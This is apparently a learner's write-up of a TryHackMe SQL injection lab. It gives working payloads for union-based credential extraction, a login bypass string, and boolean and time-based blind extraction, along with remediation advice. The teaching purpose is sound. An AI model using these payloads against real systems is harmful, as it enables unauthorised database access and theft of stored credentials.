# SQL Injection Introduction (TryHackMe)

- **Path:** Jr Penetration Tester > Web Application Vulnerabilities I
- **Completed:** 2026-10-09 - **Lab:** <ip> (interactive SQLi lab, /level1../level4)
- First room of the OWASP attack module.

Root cause is always the same: user input concatenated into a SQL query, so input becomes code.
The categories only differ in HOW you get the answer back. Fix is always prepared statements.

## Answer sheet

| Task | Question | Answer |
|---|---|---|
| 2 | Statement combining two SELECTs | *(find it yourself)* |
| 2 | Built-in metadata database | *(find it yourself)* |
| 3 | First char to probe with | *(find it yourself)* |
| 3 | SQLi type returning results in the page | *(find it yourself)* |
| 4 | In-Band subtype using error messages | *(find it yourself)* |
| 4 | Function returning current DB name | *(find it yourself)* |
| 5 | Boolean condition making WHERE always true | *(find it yourself)* |
| 6 | MySQL function for a deliberate delay | *(find it yourself)* |
| 7 | Protocol (starts with D) for OOB exfil | *(find it yourself)* |
| 7 | MSSQL stored proc for DNS lookups | *(find it yourself)* |
| 8 | Primary, most effective defence | *(find it yourself)* |
| 9 | Level 1 flag | THM{…} |
| 9 | Level 2 flag | THM{…} |
| 9 | Level 3 flag | THM{…} |
| 9 | Level 4 flag | THM{…} |

## The three categories (how feedback reaches you)
- In-Band: results come straight back in the page. Error-Based (DB errors leak structure) and
  Union-Based (append a SELECT and read it in the output).
- Blind: no data/errors shown. Infer from behaviour. Auth bypass (logged in or not), Boolean-based
  (true/false difference in the response), Time-based (SLEEP() -> slow = true).
- Out-of-Band: force the DB to make an outbound request (usually DNS) carrying the data. Needs the
  DB to have outbound network access. MySQL LOAD_FILE UNC path; MSSQL xp_dirtree/xp_cmdshell;
  catch with Burp Collaborator / Interactsh.

## Union-based methodology (Level 1)
1. Column count: `1 UNION SELECT 1`, `1,2`, `1,2,3` until no error (3 cols here).
2. Make UNION visible: set id to 0 so the real row is empty -> `0 UNION SELECT 1,2,3`.
3. DB name: `0 UNION SELECT 1,2,database()` -> sqli_one.
4. Tables: `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='sqli_one'` -> staff_users.
5. Columns: `...FROM information_schema.columns WHERE table_name='staff_users'` -> id,username,password.
6. Data: `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`
   -> admin:<redacted-pw>, martin:<redacted-pw>, jim:<redacted-pw>. Answer = martin's pw = *(find it yourself)*.

## Blind (Levels 2-4)
- L2 auth bypass: username `' OR 1=1;--`, any password. WHERE becomes always true, password check
  commented out, first row returned -> logged in.
- L3 boolean: username-check API returns {"taken":true/false}. Extract char-by-char with LIKE:
  `...where database() like 's%'`, narrow until the name/user/pass are known. Answer: admin / *(find it yourself)*.
- L4 time-based: injection in the Referrer header; response looks identical, so use timing. Gate
  SLEEP on the condition (important): `... WHERE username='admin' AND password LIKE '4%' AND SLEEP(5)`
  (an unconditional `UNION SELECT SLEEP(5),2` sleeps every time and tells you nothing). Delay = true.
  Answer: admin / *(find it yourself)*.

## Lab mechanics (where the payload goes)
The lab is a mock browser. The injection goes in the FAKE in-page address bar, after the param
(`...article?id=<payload>`, `...checkuser?username=<payload>`, `...analytics?referrer=<payload>`),
NOT the real browser address bar. The SQL Query box shows the query being built live. Login levels
use the form fields instead. Under the hood the page POSTs to /run (level=N&sql=...); L1/L2 return
rows (in-band), L3 returns true/false, L4 returns query time; completion via /checkpass, /checklogin
(L3), /checklogin2 (L4), each flag appears on the next level's page.

## Remediation (for reports)
- Prepared statements / parameterised queries: THE fix. Input is bound as data, never parsed as SQL
  (`cursor.execute("... WHERE username=%s", (u,))`, PDO `?` placeholders).
- Allowlist input validation (e.g. numeric id must be digits) alongside, never instead of.
- Least privilege DB account (no root/sa; read-only where possible) limits blast radius.
- WAF is an extra layer, not a substitute (bypassable with encoding/alt syntax).

## Lessons
- In-band = one query gets everything; blind = deduce one character at a time (slow but reliable).
- Conditional SLEEP is the whole trick for time-based: the delay must depend on the data bit you are
  testing, or you learn nothing.
- Real engagements: sqlmap automates the character grind; doing it by hand once shows why it works.
